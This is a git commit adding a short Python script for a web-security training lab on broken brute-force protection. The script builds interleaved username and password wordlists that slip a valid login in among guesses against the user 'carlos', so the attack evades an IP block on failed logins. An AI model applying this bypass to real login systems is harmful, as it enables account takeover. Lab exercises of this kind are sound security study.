80aa2bdcac3a9e4d407071c18518c3e5315ef4cd
faisalulde <faisalulde88@gmail.com>
2026-07-01 04:01:52 +0530

    Update authentication/scripts/ip-block-bypass.py

---
+++ authentication/scripts/ip-block-bypass.py
@@ -0,0 +1,22 @@
+# Lab: Broken brute-force protection, IP block
+
+print("-----Username Wordlist-----")
+for i in range(150):
+    if i % 3:
+        print("carlos")
+    else:
+        print("wiener")
+
+print("-----Password Wordlist-----")
+with open('passwords.txt', 'r') as f:
+    lines = f.readlines()
+
+i = 0
+for pwd in lines:
+    if i % 3:
+        print(pwd.strip('\n'))
+    else:
+        print("peter")
+        print(pwd.strip('\n'))
+        i += 1
+    i += 1
